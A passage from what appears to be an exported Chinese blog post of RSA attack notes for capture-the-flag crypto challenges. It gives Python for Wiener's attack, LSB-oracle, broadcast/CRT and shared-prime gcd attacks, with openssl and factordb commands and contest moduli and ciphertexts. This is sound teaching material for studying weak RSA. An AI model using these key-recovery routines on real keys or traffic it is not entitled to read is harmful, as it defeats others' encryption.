res=gmpy2.iroot(c+n*i,3)[0]\n        print i,res\n        print libnum.n2s(res)\n        print time.asctime()\n        break\n```\n\n## Rabin加密中的N可被分解\n\n```\ndef rabin_decrypt(c, p, q, e=2):\n    n = p * q\n    mp = pow(c, (p + 1) / 4, p)\n    mq = pow(c, (q + 1) / 4, q)\n    yp = gmpy2.invert(p, q)\n    yq = gmpy2.invert(q, p)\n    r = (yp * p * mq + yq * q * mp) % n\n    rr = n - r\n    s = (yp * p * mq - yq * q * mp) % n\n    ss = n - s\n    return (r, rr, s, ss)\n```\n\n## Wiener's Attack(低解密指数攻击 )\n\n```python\nfrom Crypto.PublicKey import RSA\nimport ContinuedFractions, Arithmetic\n\ndef wiener_hack(e, n):\n    # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !\n    frac = ContinuedFractions.rational_to_contfrac(e, n)\n    convergents = ContinuedFractions.convergents_from_contfrac(frac)\n    for (k, d) in convergents:\n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discr = s * s - 4 * n\n            if (discr >= 0):\n                t = Arithmetic.is_perfect_square(discr)\n                if t != -1 and (s + t) % 2 == 0:\n                    print(\"Hacked!\")\n                    return d\n    return False\n```\n\n## 私钥文件修复\n\n## LSB Oracle Attack\n\n适用情况：可以选择密文并泄露最低位。\n\n```python\nimport decimal\ndef oracle():\n    return lsb == 'odd'\n\n\ndef partial(c, e, n):\n    k = n.bit_length()\n    decimal.getcontext().prec = k  # for 'precise enough' floats\n    lo = decimal.Decimal(0)\n    hi = decimal.Decimal(n)\n    for i in range(k):\n        if not oracle(c):\n            hi = (lo + hi) / 2\n        else:\n            lo = (lo + hi) / 2\n        c = (c * pow(2, e, n)) % n\n        # print i, int(hi - lo)\n    return int(hi)\n```\n\n## 选择密文攻击\n\n选择密文攻击\n适用情况：可以构造任意密文并获得对应明文。\n\n这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足`gcd(x,n)==1` 从而使x模n的逆存在，构造密文 `c'=c*(x^e) `使解密后明文为 `m'=(m*x)%n` ，则`m=m'*x^-1(mod n)` 。可参看模意义下的运算法则部分 。\n\n## 广播攻击\n\n适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据\n\n使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个`(m^e) ==ci (mod ni)`，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用`gmpy2.iroot(M,e)` 方法。\n\n案例:\n\n```python\ndef CRT(mi, ai):\n    # mi,ai分别表示模数和取模后的值,都为列表结构\n    # Chinese Remainder Theorem\n    # lcm=lambda x , y:x*y/gcd(x,y)\n    # mul=lambda x , y:x*y\n    # assert(reduce(mul,mi)==reduce(lcm,mi))\n    # 以上可用于保证mi两两互质\n    assert (isinstance(mi, list) and isinstance(ai, list))\n    M = reduce(lambda x, y: x * y, mi)\n    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)]\n    return reduce(lambda x, y: x + y, ai_ti_Mi) % M\n\nm = random.randint(0x100000000000, 0xffffffffffff)\ne = 3\nn1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L\nn2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L\nn3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L\nc1 = pow(m, e, n1)\nc2 = pow(m, e, n2)\nc3 = pow(m, e, n3)\nprint m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[0]\n```\n\n","slug":"RSA学习","published":1,"updated":"2018-07-23T12:33:58.148Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gr0005qkdlc6aijf1x","content":"<h2 id=\"openssl相关操作\"><a href=\"#openssl相关操作\" class=\"headerlink\" title=\"openssl相关操作\"></a>openssl相关操作</h2><p>提取pubkey.pem相关信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure>\n<p>解密:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】</span><br></pre></td></tr></table></figure>\n<h2 id=\"已知p-q\"><a href=\"#已知p-q\" class=\"headerlink\" title=\"已知p,q\"></a>已知p,q</h2><p>若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def rsa_decrypt(e, c, p, q):</span><br><span class=\"line\">    phi = (p - 1) * (q - 1)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        d = gmpy2.invert(e, phi) #求e模phi的逆</span><br><span class=\"line\">        return pow(c, d, n)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print &quot;e and phi are not coprime!&quot;</span><br><span class=\"line\">        raise e</span><br></pre></td></tr></table></figure>\n<h2 id=\"查询已知的n的可分解情况\"><a href=\"#查询已知的n的可分解情况\" class=\"headerlink\" title=\"查询已知的n的可分解情况\"></a>查询已知的n的可分解情况</h2><p>在线查询：<a href=\"https://factordb.com/\" target=\"_blank\" rel=\"noopener\">https://factordb.com/</a></p>\n<p>api接口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://factordb.com/api?query=12345</span><br><span class=\"line\"></span><br><span class=\"line\">response:</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;id&quot;:&quot;12345&quot;,&quot;status&quot;:&quot;FF&quot;,&quot;factors&quot;:[[&quot;3&quot;,1],[&quot;5&quot;,1],[&quot;823&quot;,1]]&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用yafu分解N\"><a href=\"#使用yafu分解N\" class=\"headerlink\" title=\"使用yafu分解N\"></a>使用yafu分解N</h2><p>适用情况：p,q相差较大或较小时可快速分解。</p>\n<p>使用方法：yafu-x64.exe factor(233) ，yafu-x64.exe help</p>\n<p>url: <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## 模不互素 （gcd(N1,N2)!=1）</span><br><span class=\"line\"></span><br><span class=\"line\">适用情况：存在两个或更多模数 ，且gcd(N1,N2)!=1 。</span><br><span class=\"line\"></span><br><span class=\"line\">多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文欧几里得算法 部分和RSA解密 部分。</span><br><span class=\"line\"></span><br><span class=\"line\">案例: 安恒2018 6月赛:</span><br><span class=\"line\"></span><br><span class=\"line\">该题目提供20个n和20个相对应的密文，由于e为65537，所以可以排除低指数广播攻击，通过分析，可以发现n4和n17并非互质，所以可以使用模不互素进行解密。</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\"># -*- coding:utf8</span><br><span class=\"line\">import gmpy2</span><br><span class=\"line\">import sys</span><br><span class=\"line\">from libnum import gcd, n2s</span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class=\"line\">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class=\"line\"></span><br><span class=\"line\">n1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class=\"line\">c1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><span class=\"line\"></span><br><span class=\"line\">n2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class=\"line\">c2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><span class=\"line\"></span><br><span class=\"line\">n3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class=\"line\">c3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><span class=\"line\"></span><br><span class=\"line\">n4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class=\"line\">c4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><span class=\"line\"></span><br><span class=\"line\">n5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class=\"line\">c5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><span class=\"line\"></span><br><span class=\"line\">n6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class=\"line\">c6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><span class=\"line\"></span><br><span class=\"line\">n7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class=\"line\">c7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><span class=\"line\"></span><br><span class=\"line\">n8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class=\"line\">c8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><span class=\"line\"></span><br><span class=\"line\">n9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class=\"line\">c9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><span class=\"line\"></span><br><span class=\"line\">n10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class=\"line\">c10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><span class=\"line\"></span><br><span class=\"line\">n11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class=\"line\">c11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><span class=\"line\"></span><br><span class=\"line\">n12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class=\"line\">c12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><span class=\"line\"></span><br><span class=\"line\">n13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class=\"line\">c13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><span class=\"line\"></span><br><span class=\"line\">n14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class=\"line\">c14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><span class=\"line\"></span><br><span class=\"line\">n15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class=\"line\">c15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><span class=\"line\"></span><br><span class=\"line\">n16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class=\"line\">c16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><span class=\"line\"></span><br><span class=\"line\">n17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class=\"line\">c17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><span class=\"line\"></span><br><span class=\"line\">n18 = 